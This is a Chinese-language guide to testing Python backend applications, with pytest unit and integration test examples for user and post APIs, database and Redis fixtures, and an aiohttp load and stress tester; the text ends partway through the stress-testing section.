# 测试策略指南

本文档提供了Python后端应用的全面测试策略，包括单元测试、集成测试、性能测试和端到端测试的最佳实践。

## 📋 目录

- [测试策略概述](#测试策略概述)
- [测试金字塔](#测试金字塔)
- [单元测试](#单元测试)
- [集成测试](#集成测试)
- [API测试](#api测试)
- [数据库测试](#数据库测试)
- [性能测试](#性能测试)
- [安全测试](#安全测试)
- [端到端测试](#端到端测试)
- [测试自动化](#测试自动化)
- [测试数据管理](#测试数据管理)
- [测试环境管理](#测试环境管理)

## 🎯 测试策略概述

### 1. 测试原则

```python
from abc import ABC, abstractmethod
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum

class TestLevel(Enum):
    """测试级别"""
    UNIT = "unit"                    # 单元测试
    INTEGRATION = "integration"      # 集成测试
    SYSTEM = "system"                # 系统测试
    ACCEPTANCE = "acceptance"        # 验收测试

class TestType(Enum):
    """测试类型"""
    FUNCTIONAL = "functional"        # 功能测试
    PERFORMANCE = "performance"      # 性能测试
    SECURITY = "security"            # 安全测试
    USABILITY = "usability"          # 可用性测试
    COMPATIBILITY = "compatibility"  # 兼容性测试

@dataclass
class TestCase:
    """测试用例"""
    id: str
    name: str
    description: str
    level: TestLevel
    type: TestType
    priority: int
    tags: List[str]
    preconditions: List[str]
    steps: List[str]
    expected_result: str
    actual_result: Optional[str] = None
    status: Optional[str] = None

class TestStrategy:
    """测试策略管理器"""
    
    def __init__(self):
        self.test_cases: List[TestCase] = []
        self.test_coverage_target = 80  # 目标覆盖率
        self.quality_gates = {
            'unit_test_coverage': 80,
            'integration_test_coverage': 70,
            'critical_path_coverage': 100,
            'performance_threshold': 2000,  # ms
            'security_scan_pass': True
        }
    
    def add_test_case(self, test_case: TestCase):
        """添加测试用例"""
        self.test_cases.append(test_case)
    
    def get_test_cases_by_level(self, level: TestLevel) -> List[TestCase]:
        """根据级别获取测试用例"""
        return [tc for tc in self.test_cases if tc.level == level]
    
    def get_test_cases_by_priority(self, min_priority: int) -> List[TestCase]:
        """根据优先级获取测试用例"""
        return [tc for tc in self.test_cases if tc.priority >= min_priority]
    
    def validate_quality_gates(self, metrics: Dict[str, Any]) -> Dict[str, bool]:
        """验证质量门禁"""
        results = {}
        
        for gate, threshold in self.quality_gates.items():
            if gate in metrics:
                if isinstance(threshold, bool):
                    results[gate] = metrics[gate] == threshold
                else:
                    results[gate] = metrics[gate] >= threshold
            else:
                results[gate] = False
        
        return results

# 测试基础设施
class TestFixture(ABC):
    """测试夹具抽象类"""
    
    @abstractmethod
    async def setup(self):
        """测试前置设置"""
        pass
    
    @abstractmethod
    async def teardown(self):
        """测试后置清理"""
        pass

class DatabaseTestFixture(TestFixture):
    """数据库测试夹具"""
    
    def __init__(self, database_url: str):
        self.database_url = database_url
        self.engine = None
        self.session = None
    
    async def setup(self):
        """设置测试数据库"""
        from sqlalchemy import create_engine
        from sqlalchemy.orm import sessionmaker
        
        # 创建测试数据库引擎
        self.engine = create_engine(
            self.database_url,
            echo=False,
            pool_pre_ping=True
        )
        
        # 创建会话
        Session = sessionmaker(bind=self.engine)
        self.session = Session()
        
        # 创建表结构
        from templates.database.models import Base
        Base.metadata.create_all(self.engine)
    
    async def teardown(self):
        """清理测试数据库"""
        if self.session:
            self.session.close()
        
        if self.engine:
            # 删除所有表
            from templates.database.models import Base
            Base.metadata.drop_all(self.engine)
            self.engine.dispose()

class RedisTestFixture(TestFixture):
    """Redis测试夹具"""
    
    def __init__(self, redis_url: str):
        self.redis_url = redis_url
        self.redis_client = None
    
    async def setup(self):
        """设置测试Redis"""
        import aioredis
        self.redis_client = aioredis.from_url(self.redis_url)
    
    async def teardown(self):
        """清理测试Redis"""
        if self.redis_client:
            await self.redis_client.flushdb()  # 清空测试数据库
            await self.redis_client.close()

class APITestFixture(TestFixture):
    """API测试夹具"""
    
    def __init__(self, app):
        self.app = app
        self.client = None
    
    async def setup(self):
        """设置测试客户端"""
        from httpx import AsyncClient
        self.client = AsyncClient(app=self.app, base_url="http://test")
    
    async def teardown(self):
        """清理测试客户端"""
        if self.client:
            await self.client.aclose()
```

## 🔺 测试金字塔

### 1. 测试金字塔实现

```python
import pytest
import asyncio
from typing import Dict, List, Any
from dataclasses import dataclass

@dataclass
class TestMetrics:
    """测试指标"""
    total_tests: int
    passed_tests: int
    failed_tests: int
    skipped_tests: int
    coverage_percentage: float
    execution_time: float

class TestPyramid:
    """测试金字塔管理器"""
    
    def __init__(self):
        self.unit_tests_ratio = 0.7      # 70%单元测试
        self.integration_tests_ratio = 0.2  # 20%集成测试
        self.e2e_tests_ratio = 0.1       # 10%端到端测试
        
        self.metrics: Dict[TestLevel, TestMetrics] = {}
    
    def validate_pyramid_structure(self, test_counts: Dict[TestLevel, int]) -> bool:
        """验证测试金字塔结构"""
        total_tests = sum(test_counts.values())
        
        if total_tests == 0:
            return False
        
        unit_ratio = test_counts.get(TestLevel.UNIT, 0) / total_tests
        integration_ratio = test_counts.get(TestLevel.INTEGRATION, 0) / total_tests
        e2e_ratio = test_counts.get(TestLevel.ACCEPTANCE, 0) / total_tests
        
        # 允许10%的偏差
        tolerance = 0.1
        
        return (
            abs(unit_ratio - self.unit_tests_ratio) <= tolerance and
            abs(integration_ratio - self.integration_tests_ratio) <= tolerance and
            abs(e2e_ratio - self.e2e_tests_ratio) <= tolerance
        )
    
    def calculate_test_efficiency(self) -> Dict[str, float]:
        """计算测试效率"""
        efficiency = {}
        
        for level, metrics in self.metrics.items():
            if metrics.total_tests > 0:
                pass_rate = metrics.passed_tests / metrics.total_tests
                time_per_test = metrics.execution_time / metrics.total_tests
                
                # 效率 = 通过率 / 平均执行时间
                efficiency[level.value] = pass_rate / max(time_per_test, 0.001)
        
        return efficiency

# 测试运行器
class TestRunner:
    """测试运行器"""
    
    def __init__(self):
        self.fixtures: List[TestFixture] = []
        self.test_results: List[Dict[str, Any]] = []
    
    def add_fixture(self, fixture: TestFixture):
        """添加测试夹具"""
        self.fixtures.append(fixture)
    
    async def setup_fixtures(self):
        """设置所有夹具"""
        for fixture in self.fixtures:
            await fixture.setup()
    
    async def teardown_fixtures(self):
        """清理所有夹具"""
        for fixture in reversed(self.fixtures):  # 逆序清理
            await fixture.teardown()
    
    async def run_test_suite(self, test_functions: List[callable]) -> TestMetrics:
        """运行测试套件"""
        import time
        
        start_time = time.time()
        passed = 0
        failed = 0
        skipped = 0
        
        try:
            await self.setup_fixtures()
            
            for test_func in test_functions:
                try:
                    if asyncio.iscoroutinefunction(test_func):
                        await test_func()
                    else:
                        test_func()
                    passed += 1
                    
                except pytest.skip.Exception:
                    skipped += 1
                    
                except Exception as e:
                    failed += 1
                    self.test_results.append({
                        'test': test_func.__name__,
                        'status': 'failed',
                        'error': str(e)
                    })
        
        finally:
            await self.teardown_fixtures()
        
        execution_time = time.time() - start_time
        total_tests = passed + failed + skipped
        
        return TestMetrics(
            total_tests=total_tests,
            passed_tests=passed,
            failed_tests=failed,
            skipped_tests=skipped,
            coverage_percentage=0.0,  # 需要外部工具计算
            execution_time=execution_time
        )
```

## 🧪 单元测试

### 1. 单元测试最佳实践

```python
import pytest
import unittest.mock as mock
from unittest.mock import Mock, patch, MagicMock
from typing import Any, Dict, List
import asyncio

class UnitTestBase:
    """单元测试基类"""
    
    def setup_method(self):
        """每个测试方法前的设置"""
        self.mocks = {}
    
    def teardown_method(self):
        """每个测试方法后的清理"""
        # 清理所有mock
        for mock_obj in self.mocks.values():
            if hasattr(mock_obj, 'reset_mock'):
                mock_obj.reset_mock()
    
    def create_mock(self, name: str, **kwargs) -> Mock:
        """创建并管理mock对象"""
        mock_obj = Mock(**kwargs)
        self.mocks[name] = mock_obj
        return mock_obj

# 数据库模型测试
class TestUserModel(UnitTestBase):
    """用户模型单元测试"""
    
    def test_user_creation(self):
        """测试用户创建"""
        from templates.database.models import User
        
        user = User(
            username="testuser",
            email="test@example.com",
            password_hash="hashed_password"
        )
        
        assert user.username == "testuser"
        assert user.email == "test@example.com"
        assert user.password_hash == "hashed_password"
        assert user.is_active is True  # 默认值
    
    def test_user_validation(self):
        """测试用户数据验证"""
        from templates.database.models import User
        
        # 测试无效邮箱
        with pytest.raises(ValueError):
            User(
                username="testuser",
                email="invalid_email",
                password_hash="hashed_password"
            ).validate_email()
    
    def test_user_password_methods(self):
        """测试用户密码相关方法"""
        from templates.database.models import User
        
        user = User(username="testuser", email="test@example.com")
        
        # 测试密码设置
        user.set_password("password123")
        assert user.password_hash is not None
        assert user.password_hash != "password123"  # 应该被哈希
        
        # 测试密码验证
        assert user.check_password("password123") is True
        assert user.check_password("wrongpassword") is False

# 服务层测试
class TestUserService(UnitTestBase):
    """用户服务单元测试"""
    
    @pytest.fixture
    def user_service(self):
        """用户服务夹具"""
        from templates.api.services import UserService
        
        # Mock数据库会话
        mock_session = self.create_mock('session')
        return UserService(session=mock_session)
    
    @pytest.mark.asyncio
    async def test_create_user_success(self, user_service):
        """测试成功创建用户"""
        # 准备测试数据
        user_data = {
            "username": "newuser",
            "email": "newuser@example.com",
            "password": "password123"
        }
        
        # Mock数据库操作
        mock_user = Mock()
        mock_user.id = 1
        mock_user.username = user_data["username"]
        mock_user.email = user_data["email"]
        
        self.mocks['session'].add.return_value = None
        self.mocks['session'].commit.return_value = None
        self.mocks['session'].refresh.return_value = None
        
        with patch('templates.database.models.User') as MockUser:
            MockUser.return_value = mock_user
            
            result = await user_service.create_user(user_data)
            
            # 验证结果
            assert result.id == 1
            assert result.username == user_data["username"]
            assert result.email == user_data["email"]
            
            # 验证调用
            MockUser.assert_called_once()
            self.mocks['session'].add.assert_called_once_with(mock_user)
            self.mocks['session'].commit.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_create_user_duplicate_email(self, user_service):
        """测试创建重复邮箱用户"""
        from sqlalchemy.exc import IntegrityError
        
        user_data = {
            "username": "newuser",
            "email": "existing@example.com",
            "password": "password123"
        }
        
        # Mock数据库完整性错误
        self.mocks['session'].commit.side_effect = IntegrityError(
            "duplicate key", None, None
        )
        
        with pytest.raises(ValueError, match="Email already exists"):
            await user_service.create_user(user_data)
    
    @pytest.mark.asyncio
    async def test_get_user_by_id(self, user_service):
        """测试根据ID获取用户"""
        user_id = 1
        mock_user = Mock()
        mock_user.id = user_id
        mock_user.username = "testuser"
        
        # Mock查询结果
        mock_query = Mock()
        mock_query.filter.return_value.first.return_value = mock_user
        self.mocks['session'].query.return_value = mock_query
        
        result = await user_service.get_user_by_id(user_id)
        
        assert result.id == user_id
        assert result.username == "testuser"
        
        # 验证查询调用
        self.mocks['session'].query.assert_called_once()

# API端点测试
class TestUserAPI(UnitTestBase):
    """用户API单元测试"""
    
    @pytest.fixture
    def client(self):
        """测试客户端夹具"""
        from fastapi.testclient import TestClient
        from templates.api.main import app
        
        return TestClient(app)
    
    def test_create_user_endpoint(self, client):
        """测试创建用户端点"""
        user_data = {
            "username": "newuser",
            "email": "newuser@example.com",
            "password": "password123"
        }
        
        with patch('templates.api.services.UserService.create_user') as mock_create:
            mock_user = Mock()
            mock_user.id = 1
            mock_user.username = user_data["username"]
            mock_user.email = user_data["email"]
            mock_create.return_value = mock_user
            
            response = client.post("/api/users", json=user_data)
            
            assert response.status_code == 201
            response_data = response.json()
            assert response_data["username"] == user_data["username"]
            assert response_data["email"] == user_data["email"]
            assert "password" not in response_data  # 密码不应该返回
    
    def test_get_user_endpoint(self, client):
        """测试获取用户端点"""
        user_id = 1
        
        with patch('templates.api.services.UserService.get_user_by_id') as mock_get:
            mock_user = Mock()
            mock_user.id = user_id
            mock_user.username = "testuser"
            mock_user.email = "test@example.com"
            mock_get.return_value = mock_user
            
            response = client.get(f"/api/users/{user_id}")
            
            assert response.status_code == 200
            response_data = response.json()
            assert response_data["id"] == user_id
            assert response_data["username"] == "testuser"
    
    def test_get_nonexistent_user(self, client):
        """测试获取不存在的用户"""
        user_id = 999
        
        with patch('templates.api.services.UserService.get_user_by_id') as mock_get:
            mock_get.return_value = None
            
            response = client.get(f"/api/users/{user_id}")
            
            assert response.status_code == 404
            assert "User not found" in response.json()["detail"]

# 工具函数测试
class TestUtilityFunctions(UnitTestBase):
    """工具函数单元测试"""
    
    def test_password_hashing(self):
        """测试密码哈希功能"""
        from templates.utils.security import hash_password, verify_password
        
        password = "test_password_123"
        
        # 测试哈希
        hashed = hash_password(password)
        assert hashed != password
        assert len(hashed) > 0
        
        # 测试验证
        assert verify_password(password, hashed) is True
        assert verify_password("wrong_password", hashed) is False
    
    def test_jwt_token_operations(self):
        """测试JWT令牌操作"""
        from templates.utils.auth import create_access_token, decode_token
        
        payload = {"user_id": 123, "username": "testuser"}
        
        # 创建令牌
        token = create_access_token(payload)
        assert isinstance(token, str)
        assert len(token) > 0
        
        # 解码令牌
        decoded_payload = decode_token(token)
        assert decoded_payload["user_id"] == 123
        assert decoded_payload["username"] == "testuser"
    
    def test_email_validation(self):
        """测试邮箱验证"""
        from templates.utils.validators import validate_email
        
        # 有效邮箱
        assert validate_email("test@example.com") is True
        assert validate_email("user.name+tag@domain.co.uk") is True
        
        # 无效邮箱
        assert validate_email("invalid_email") is False
        assert validate_email("@domain.com") is False
        assert validate_email("user@") is False
    
    @pytest.mark.parametrize("input_data,expected", [
        ({"key1": "value1", "key2": "value2"}, True),
        ({}, False),
        (None, False),
        ({"key1": None}, False),
    ])
    def test_data_validation_parametrized(self, input_data, expected):
        """参数化测试数据验证"""
        from templates.utils.validators import validate_required_fields
        
        result = validate_required_fields(input_data, ["key1", "key2"])
        assert result == expected

# 异步函数测试
class TestAsyncFunctions(UnitTestBase):
    """异步函数单元测试"""
    
    @pytest.mark.asyncio
    async def test_async_cache_operations(self):
        """测试异步缓存操作"""
        from templates.cache.redis_cache import RedisCache
        
        # Mock Redis客户端
        mock_redis = self.create_mock('redis')
        mock_redis.get.return_value = b'{"key": "value"}'
        mock_redis.set.return_value = True
        mock_redis.delete.return_value = 1
        
        cache = RedisCache(mock_redis)
        
        # 测试设置缓存
        result = await cache.set("test_key", {"key": "value"})
        assert result is True
        mock_redis.set.assert_called_once()
        
        # 测试获取缓存
        cached_value = await cache.get("test_key")
        assert cached_value == {"key": "value"}
        mock_redis.get.assert_called_once_with("test_key")
        
        # 测试删除缓存
        delete_result = await cache.delete("test_key")
        assert delete_result is True
        mock_redis.delete.assert_called_once_with("test_key")
    
    @pytest.mark.asyncio
    async def test_async_database_operations(self):
        """测试异步数据库操作"""
        from templates.database.async_session import AsyncDatabaseManager
        
        # Mock异步会话
        mock_session = self.create_mock('async_session')
        mock_session.execute.return_value = Mock()
        mock_session.commit.return_value = None
        
        db_manager = AsyncDatabaseManager("sqlite+aiosqlite:///:memory:")
        db_manager.session = mock_session
        
        # 测试异步查询
        query = "SELECT * FROM users WHERE id = :user_id"
        params = {"user_id": 1}
        
        await db_manager.execute_query(query, params)
        
        mock_session.execute.assert_called_once()
        mock_session.commit.assert_called_once()
```

## 🔗 集成测试

### 1. 数据库集成测试

```python
import pytest
import asyncio
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from typing import Generator

class DatabaseIntegrationTest:
    """数据库集成测试基类"""
    
    @pytest.fixture(scope="class")
    def db_engine(self):
        """数据库引擎夹具"""
        # 使用内存SQLite进行测试
        engine = create_engine(
            "sqlite:///:memory:",
            echo=False,
            pool_pre_ping=True
        )
        
        # 创建表结构
        from templates.database.models import Base
        Base.metadata.create_all(engine)
        
        yield engine
        
        # 清理
        Base.metadata.drop_all(engine)
        engine.dispose()
    
    @pytest.fixture
    def db_session(self, db_engine) -> Generator:
        """数据库会话夹具"""
        Session = sessionmaker(bind=db_engine)
        session = Session()
        
        try:
            yield session
        finally:
            session.rollback()
            session.close()
    
    @pytest.fixture
    def sample_users(self, db_session):
        """示例用户数据夹具"""
        from templates.database.models import User
        
        users = [
            User(
                username="user1",
                email="user1@example.com",
                password_hash="hashed_password_1"
            ),
            User(
                username="user2",
                email="user2@example.com",
                password_hash="hashed_password_2"
            ),
            User(
                username="user3",
                email="user3@example.com",
                password_hash="hashed_password_3"
            )
        ]
        
        for user in users:
            db_session.add(user)
        db_session.commit()
        
        return users

class TestUserDatabaseIntegration(DatabaseIntegrationTest):
    """用户数据库集成测试"""
    
    def test_user_crud_operations(self, db_session):
        """测试用户CRUD操作"""
        from templates.database.models import User
        
        # 创建用户
        user = User(
            username="testuser",
            email="test@example.com",
            password_hash="hashed_password"
        )
        db_session.add(user)
        db_session.commit()
        
        # 验证用户已创建
        assert user.id is not None
        
        # 读取用户
        retrieved_user = db_session.query(User).filter_by(username="testuser").first()
        assert retrieved_user is not None
        assert retrieved_user.email == "test@example.com"
        
        # 更新用户
        retrieved_user.email = "updated@example.com"
        db_session.commit()
        
        # 验证更新
        updated_user = db_session.query(User).filter_by(id=user.id).first()
        assert updated_user.email == "updated@example.com"
        
        # 删除用户
        db_session.delete(updated_user)
        db_session.commit()
        
        # 验证删除
        deleted_user = db_session.query(User).filter_by(id=user.id).first()
        assert deleted_user is None
    
    def test_user_relationships(self, db_session, sample_users):
        """测试用户关系"""
        from templates.database.models import User, Post
        
        user = sample_users[0]
        
        # 创建文章
        posts = [
            Post(title="Post 1", content="Content 1", author_id=user.id),
            Post(title="Post 2", content="Content 2", author_id=user.id)
        ]
        
        for post in posts:
            db_session.add(post)
        db_session.commit()
        
        # 测试关系查询
        user_with_posts = db_session.query(User).filter_by(id=user.id).first()
        assert len(user_with_posts.posts) == 2
        assert user_with_posts.posts[0].title == "Post 1"
    
    def test_database_constraints(self, db_session):
        """测试数据库约束"""
        from templates.database.models import User
        from sqlalchemy.exc import IntegrityError
        
        # 创建用户
        user1 = User(
            username="uniqueuser",
            email="unique@example.com",
            password_hash="hashed_password"
        )
        db_session.add(user1)
        db_session.commit()
        
        # 尝试创建重复邮箱的用户
        user2 = User(
            username="anotheruser",
            email="unique@example.com",  # 重复邮箱
            password_hash="hashed_password"
        )
        db_session.add(user2)
        
        with pytest.raises(IntegrityError):
            db_session.commit()
    
    def test_database_transactions(self, db_session):
        """测试数据库事务"""
        from templates.database.models import User
        
        # 开始事务
        user1 = User(
            username="user1",
            email="user1@example.com",
            password_hash="hashed_password"
        )
        user2 = User(
            username="user2",
            email="user2@example.com",
            password_hash="hashed_password"
        )
        
        db_session.add(user1)
        db_session.add(user2)
        
        # 模拟事务中的错误
        try:
            # 故意创建一个会失败的操作
            user3 = User(
                username="user3",
                email="user1@example.com",  # 重复邮箱
                password_hash="hashed_password"
            )
            db_session.add(user3)
            db_session.commit()
        except Exception:
            db_session.rollback()
        
        # 验证回滚后没有用户被创建
        user_count = db_session.query(User).count()
        assert user_count == 0
```

### 2. API集成测试

```python
import pytest
import asyncio
from httpx import AsyncClient
from typing import Dict, Any

class APIIntegrationTest:
    """API集成测试基类"""
    
    @pytest.fixture
    async def app(self):
        """应用夹具"""
        from templates.api.main import create_app
        
        app = create_app(testing=True)
        yield app
    
    @pytest.fixture
    async def client(self, app) -> AsyncClient:
        """异步客户端夹具"""
        async with AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    @pytest.fixture
    async def auth_headers(self, client) -> Dict[str, str]:
        """认证头夹具"""
        # 创建测试用户并获取令牌
        user_data = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "password123"
        }
        
        # 注册用户
        await client.post("/api/auth/register", json=user_data)
        
        # 登录获取令牌
        login_data = {
            "username": user_data["username"],
            "password": user_data["password"]
        }
        
        response = await client.post("/api/auth/login", json=login_data)
        token = response.json()["access_token"]
        
        return {"Authorization": f"Bearer {token}"}

class TestUserAPIIntegration(APIIntegrationTest):
    """用户API集成测试"""
    
    @pytest.mark.asyncio
    async def test_user_registration_flow(self, client):
        """测试用户注册流程"""
        user_data = {
            "username": "newuser",
            "email": "newuser@example.com",
            "password": "password123"
        }
        
        # 注册用户
        response = await client.post("/api/auth/register", json=user_data)
        
        assert response.status_code == 201
        response_data = response.json()
        assert response_data["username"] == user_data["username"]
        assert response_data["email"] == user_data["email"]
        assert "password" not in response_data
        assert "id" in response_data
    
    @pytest.mark.asyncio
    async def test_user_login_flow(self, client):
        """测试用户登录流程"""
        # 先注册用户
        user_data = {
            "username": "loginuser",
            "email": "login@example.com",
            "password": "password123"
        }
        
        await client.post("/api/auth/register", json=user_data)
        
        # 登录
        login_data = {
            "username": user_data["username"],
            "password": user_data["password"]
        }
        
        response = await client.post("/api/auth/login", json=login_data)
        
        assert response.status_code == 200
        response_data = response.json()
        assert "access_token" in response_data
        assert "token_type" in response_data
        assert response_data["token_type"] == "bearer"
    
    @pytest.mark.asyncio
    async def test_protected_endpoint_access(self, client, auth_headers):
        """测试受保护端点访问"""
        # 访问受保护的用户资料端点
        response = await client.get("/api/users/me", headers=auth_headers)
        
        assert response.status_code == 200
        response_data = response.json()
        assert "username" in response_data
        assert "email" in response_data
    
    @pytest.mark.asyncio
    async def test_unauthorized_access(self, client):
        """测试未授权访问"""
        # 不带令牌访问受保护端点
        response = await client.get("/api/users/me")
        
        assert response.status_code == 401
        assert "Not authenticated" in response.json()["detail"]
    
    @pytest.mark.asyncio
    async def test_user_profile_update(self, client, auth_headers):
        """测试用户资料更新"""
        update_data = {
            "email": "updated@example.com",
            "full_name": "Updated Name"
        }
        
        response = await client.put(
            "/api/users/me", 
            json=update_data, 
            headers=auth_headers
        )
        
        assert response.status_code == 200
        response_data = response.json()
        assert response_data["email"] == update_data["email"]
        assert response_data["full_name"] == update_data["full_name"]
    
    @pytest.mark.asyncio
    async def test_user_list_pagination(self, client, auth_headers):
        """测试用户列表分页"""
        # 创建多个用户
        for i in range(15):
            user_data = {
                "username": f"user{i}",
                "email": f"user{i}@example.com",
                "password": "password123"
            }
            await client.post("/api/auth/register", json=user_data)
        
        # 测试分页
        response = await client.get(
            "/api/users?page=1&per_page=10", 
            headers=auth_headers
        )
        
        assert response.status_code == 200
        response_data = response.json()
        assert "items" in response_data
        assert "total" in response_data
        assert "page" in response_data
        assert "per_page" in response_data
        assert len(response_data["items"]) <= 10

class TestPostAPIIntegration(APIIntegrationTest):
    """文章API集成测试"""
    
    @pytest.mark.asyncio
    async def test_post_crud_operations(self, client, auth_headers):
        """测试文章CRUD操作"""
        # 创建文章
        post_data = {
            "title": "Test Post",
            "content": "This is a test post content.",
            "tags": ["test", "api"]
        }
        
        create_response = await client.post(
            "/api/posts", 
            json=post_data, 
            headers=auth_headers
        )
        
        assert create_response.status_code == 201
        created_post = create_response.json()
        post_id = created_post["id"]
        
        # 读取文章
        get_response = await client.get(f"/api/posts/{post_id}")
        assert get_response.status_code == 200
        retrieved_post = get_response.json()
        assert retrieved_post["title"] == post_data["title"]
        
        # 更新文章
        update_data = {
            "title": "Updated Test Post",
            "content": "Updated content."
        }
        
        update_response = await client.put(
            f"/api/posts/{post_id}", 
            json=update_data, 
            headers=auth_headers
        )
        
        assert update_response.status_code == 200
        updated_post = update_response.json()
        assert updated_post["title"] == update_data["title"]
        
        # 删除文章
        delete_response = await client.delete(
            f"/api/posts/{post_id}", 
            headers=auth_headers
        )
        
        assert delete_response.status_code == 204
        
        # 验证删除
        get_deleted_response = await client.get(f"/api/posts/{post_id}")
        assert get_deleted_response.status_code == 404
    
    @pytest.mark.asyncio
    async def test_post_search_and_filter(self, client, auth_headers):
        """测试文章搜索和过滤"""
        # 创建多篇文章
        posts_data = [
            {
                "title": "Python Tutorial",
                "content": "Learn Python programming",
                "tags": ["python", "tutorial"]
            },
            {
                "title": "JavaScript Guide",
                "content": "JavaScript fundamentals",
                "tags": ["javascript", "guide"]
            },
            {
                "title": "Python Advanced",
                "content": "Advanced Python concepts",
                "tags": ["python", "advanced"]
            }
        ]
        
        for post_data in posts_data:
            await client.post("/api/posts", json=post_data, headers=auth_headers)
        
        # 搜索包含"Python"的文章
        search_response = await client.get("/api/posts?search=Python")
        assert search_response.status_code == 200
        search_results = search_response.json()
        assert len(search_results["items"]) == 2
        
        # 按标签过滤
        filter_response = await client.get("/api/posts?tags=python")
        assert filter_response.status_code == 200
        filter_results = filter_response.json()
        assert len(filter_results["items"]) == 2
```

## 🚀 性能测试

### 1. 负载测试

```python
import asyncio
import time
import statistics
from typing import List, Dict, Any, Callable
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import aiohttp

@dataclass
class PerformanceMetrics:
    """性能指标"""
    total_requests: int
    successful_requests: int
    failed_requests: int
    avg_response_time: float
    min_response_time: float
    max_response_time: float
    p95_response_time: float
    p99_response_time: float
    requests_per_second: float
    error_rate: float

class LoadTester:
    """负载测试器"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.response_times: List[float] = []
        self.errors: List[str] = []
    
    async def single_request(
        self, 
        session: aiohttp.ClientSession,
        method: str,
        endpoint: str,
        data: Dict[str, Any] = None,
        headers: Dict[str, str] = None
    ) -> Dict[str, Any]:
        """单个请求"""
        start_time = time.time()
        
        try:
            url = f"{self.base_url}{endpoint}"
            
            if method.upper() == "GET":
                async with session.get(url, headers=headers) as response:
                    response_time = time.time() - start_time
                    return {
                        "success": True,
                        "status_code": response.status,
                        "response_time": response_time,
                        "error": None
                    }
            
            elif method.upper() == "POST":
                async with session.post(url, json=data, headers=headers) as response:
                    response_time = time.time() - start_time
                    return {
                        "success": True,
                        "status_code": response.status,
                        "response_time": response_time,
                        "error": None
                    }
        
        except Exception as e:
            response_time = time.time() - start_time
            return {
                "success": False,
                "status_code": 0,
                "response_time": response_time,
                "error": str(e)
            }
    
    async def load_test(
        self,
        method: str,
        endpoint: str,
        concurrent_users: int = 10,
        total_requests: int = 100,
        data: Dict[str, Any] = None,
        headers: Dict[str, str] = None
    ) -> PerformanceMetrics:
        """执行负载测试"""
        self.response_times.clear()
        self.errors.clear()
        
        connector = aiohttp.TCPConnector(limit=concurrent_users * 2)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(
            connector=connector, 
            timeout=timeout
        ) as session:
            
            # 创建任务
            tasks = []
            for _ in range(total_requests):
                task = self.single_request(session, method, endpoint, data, headers)
                tasks.append(task)
            
            # 限制并发数
            semaphore = asyncio.Semaphore(concurrent_users)
            
            async def limited_request(task):
                async with semaphore:
                    return await task
            
            # 执行所有请求
            start_time = time.time()
            results = await asyncio.gather(
                *[limited_request(task) for task in tasks],
                return_exceptions=True
            )
            total_time = time.time() - start_time
            
            # 分析结果
            successful_requests = 0
            failed_requests = 0
            
            for result in results:
                if isinstance(result, dict):
                    self.response_times.append(result["response_time"])
                    
                    if result["success"] and 200 <= result["status_code"] < 300:
                        successful_requests += 1
                    else:
                        failed_requests += 1
                        if result["error"]:
                            self.errors.append(result["error"])
                else:
                    failed_requests += 1
                    self.errors.append(str(result))
            
            # 计算性能指标
            if self.response_times:
                avg_response_time = statistics.mean(self.response_times)
                min_response_time = min(self.response_times)
                max_response_time = max(self.response_times)
                p95_response_time = statistics.quantiles(self.response_times, n=20)[18]  # 95th percentile
                p99_response_time = statistics.quantiles(self.response_times, n=100)[98]  # 99th percentile
            else:
                avg_response_time = 0
                min_response_time = 0
                max_response_time = 0
                p95_response_time = 0
                p99_response_time = 0
            
            requests_per_second = total_requests / total_time if total_time > 0 else 0
            error_rate = failed_requests / total_requests if total_requests > 0 else 0
            
            return PerformanceMetrics(
                total_requests=total_requests,
                successful_requests=successful_requests,
                failed_requests=failed_requests,
                avg_response_time=avg_response_time,
                min_response_time=min_response_time,
                max_response_time=max_response_time,
                p95_response_time=p95_response_time,
                p99_response_time=p99_response_time,
                requests_per_second=requests_per_second,
                error_rate=error_rate
            )
    
    def print_results(self, metrics: PerformanceMetrics):
        """打印测试结果"""
        print("\n=== 负载测试结果 ===")
        print(f"总请求数: {metrics.total_requests}")
        print(f"成功请求数: {metrics.successful_requests}")
        print(f"失败请求数: {metrics.failed_requests}")
        print(f"错误率: {metrics.error_rate:.2%}")
        print(f"平均响应时间: {metrics.avg_response_time:.3f}s")
        print(f"最小响应时间: {metrics.min_response_time:.3f}s")
        print(f"最大响应时间: {metrics.max_response_time:.3f}s")
        print(f"95%响应时间: {metrics.p95_response_time:.3f}s")
        print(f"99%响应时间: {metrics.p99_response_time:.3f}s")
        print(f"每秒请求数: {metrics.requests_per_second:.2f} RPS")
        
        if self.errors:
            print("\n=== 错误信息 ===")
            for error in set(self.errors[:10]):  # 显示前10个唯一错误
                print(f"- {error}")

# 压力测试
class StressTester:
    """压力测试器"""
    
    def __init__(self, load_tester: LoadTester):
        self.load_tester = load_tester
    
    async def stress_test(
        self,
        method: str,
        endpoint: str,
        max_users: int = 100,
        step_size: int = 10,
        step_duration: int = 30,
        data: Dict[str, Any] = None,
        headers: Dict[str, str] = None
    ) -> List[PerformanceMetrics]:
        """执行压力测试"""
        results = []
        
        for users in range(step_size, max_users + 1, step_size):
            print(f"\n测试 {users} 并发用户...")
            
            # 计算每个步骤的请求数
            requests_per_step = users * step_duration // 10  # 假设每个用户每10秒发送一个请求
            
            metrics = await self.load_tester.load_test(
                method=method,
                endpoint=endpoint,
                concurrent_users=users,
                total_requests=requests_per_step,
                data=data,
                headers=headers
            )
            
            results.append(metrics)
            
            # 检查是否达到系统极限
            if metrics.error_rate > 0.1 or metrics.avg_response_time > 5.0:
                print(f"系统在 {users} 并发用户时达到极限")
                break
            
            # 等待系统恢复
            await asyncio.sleep(5)
        
        return results
    
    def analyze_stress_results(self, results: List[PerformanceMetrics]):
        """分析压力测试结果"""
        print("\n=== 压力测试分析 ===")
        
        for i, metrics in enumerate(results):
            users = (i + 1) * 10  # 假设步长为10
            print(f"\n{users} 并发用户:")
            print(f"  RPS: {metrics.requests_per_second:.2f}")
            print(f"  平均响应时间: {metrics.avg_response_time:.3f}s")
            print(f"  错误率: {metrics.error_rate:.2%}")
        
        # 找到最佳性能点
        best_rps = max(results, key=lambda x: x.requests_per_second)
